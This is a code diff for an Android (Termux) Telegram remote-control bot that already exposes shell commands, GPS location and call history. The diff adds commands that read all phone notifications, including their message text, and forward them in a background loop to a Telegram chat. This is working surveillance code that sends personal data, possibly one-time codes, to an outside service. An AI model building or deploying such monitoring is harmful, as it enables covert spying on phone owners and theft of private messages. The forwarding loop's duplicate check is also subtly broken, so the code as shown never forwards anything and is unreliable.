@@ -123,6 +123,9 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         "/tree [path]        - Folder tree view\n\n"
         "🌐 OTHER:\n"
         "/notify [msg] - Send notification\n"
+        "/notifications  → all active notification see\n"
+        "/notif          → new notification auto forward\n"
+        "/stop_notif     → forward stop\n"
         "/location     - GPS location\n"
         "/shell [cmd]  - Run command\n"
         "/sh [cmd]     - Short alias\n"
@@ -252,6 +255,117 @@ f"   📱 {call.get('phone_number', 'N/A')}\n"
     
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
+
+# ════════════════════════════════════════════
+# NOTIFICATION SYSTEM
+# ════════════════════════════════════════════
+
+import threading as _notif_th
+notif_stop_event = _notif_th.Event()
+notif_stop_event.set()
+last_notifs = set()
+notif_lock = _notif_th.Lock()
+
+async def notifications(update, ctx):
+    if not auth(update): return
+    result = shell("termux-notification-list")
+    if not result or "error" in result.lower():
+        await update.message.reply_text("❌ Notification পাওয়া যায়নি!\nSettings → Notification Access → Termux:API → ON করুন")
+        return
+    try:
+        import json
+        notifs = json.loads(result)
+        if not notifs:
+            await update.message.reply_text("📭 কোনো notification নেই!")
+            return
+        msg = "🔔 <b>Active Notifications:</b>\n\n"
+        for n in notifs[:20]:
+            app   = n.get("packageName", "Unknown").split(".")[-1]
+            title = n.get("title", "")
+            text  = n.get("content", "")
+            msg  += f"📱 <b>{app}</b>\n"
+            if title: msg += f"   📌 {title}\n"
+            if text:  msg += f"   💬 {text}\n"
+            msg  += "\n"
+        if len(msg) > 4000:
+            for i in range(0, len(msg), 4000):
+                await update.message.reply_text(msg[i:i+4000], parse_mode="HTML")
+        else:
+            await update.message.reply_text(msg, parse_mode="HTML")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {e}")
+
+async def start_notif_forward(update, ctx):
+    if not is_owner(update): return
+    global notif_stop_event, last_notifs
+
+    if not notif_stop_event.is_set():
+        await update.message.reply_text("⚠️ আগে থেকেই চলছে! বন্ধ করতে /stop_notif")
+        return
+
+    notif_stop_event.clear()
+    chat_id = update.effective_chat.id
+    await update.message.reply_text("🔔 Notification Forward চালু!\nবন্ধ করতে /stop_notif")
+
+    import threading, requests as _req, json, time
+
+    def notif_loop():
+        global last_notifs
+        import subprocess as _sp, json as _json, time as _time, requests as _req
+        while not notif_stop_event.is_set():
+            try:
+                result = _sp.run(
+                    ["termux-notification-list"],
+                    capture_output=True, text=True, timeout=15
+                ).stdout.strip()
+
+                if not result:
+                    _time.sleep(3)
+                    continue
+
+                notifs = _json.loads(result)
+                current = set()
+
+                for n in notifs:
+                    nid   = str(n.get("id","")) + n.get("packageName","") + str(n.get("title",""))
+                    current.add(nid)
+
+                    if nid not in last_notifs and nid not in current:
+                        app   = n.get("packageName","Unknown").split(".")[-1]
+                        title = n.get("title","")
+                        text  = n.get("content","")
+                        msg   = f"🔔 <b>New Notification!</b>\n\n📱 <b>{app}</b>\n"
+                        if title: msg += f"📌 {title}\n"
+                        if text:  msg += f"💬 {text}"
+
+                        try:
+                            _req.post(
+                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                                data={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"},
+                                timeout=10
+                            )
+                        except:
+                            pass
+
+                with notif_lock:
+                    last_notifs = current
+
+            except _json.JSONDecodeError:
+                pass
+            except Exception as e:
+                pass
+
+            _time.sleep(3)
+
+    import threading as _th
+    t = _th.Thread(target=notif_loop, daemon=False)
+    t.start()
+
+async def stop_notif(update, ctx):
+    if not is_owner(update): return
+    global notif_stop_event
+    notif_stop_event.set()
+    await update.message.reply_text("🛑 Notification Forward বন্ধ হয়েছে!")
 
 # ─────────────────────────────────────────
 # DEVICE INFO
@@ -1093,6 +1207,9 @@ def main():
         ("mute",       mute),
         ("unmute",     unmute),
         ("pwd",        pwd),
+        ("notifications",  notifications),
+        ("notif",         start_notif_forward),
+        ("stop_notif",    stop_notif),
         ("cd",         cd),
         ("ls",         ls),
         ("calls", call_history),
